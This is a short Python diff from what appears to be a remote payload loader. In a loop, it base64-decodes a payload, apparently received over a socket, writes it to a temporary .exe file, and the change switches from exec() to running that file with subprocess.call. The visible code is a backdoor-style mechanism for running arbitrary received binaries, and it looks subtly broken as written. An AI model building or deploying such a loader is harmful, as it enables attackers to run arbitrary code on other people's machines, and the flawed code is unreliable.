@@ -2,6 +2,7 @@ import base64
 import struct
 import socket
 import tempfile
+import subprocess
 
 
 # TODO: conn keepalive
@@ -54,11 +55,8 @@ while True:
         payload_bytes = base64.b64decode(payload)
 
         f = tempfile.TemporaryFile(suffix=".exe")
-        file_path = f.name
         f.write(payload_bytes)
-
-        f.seek(0)
-        exec(f.read())
+        subprocess.call(f.name)
         f.close()
 
     else:
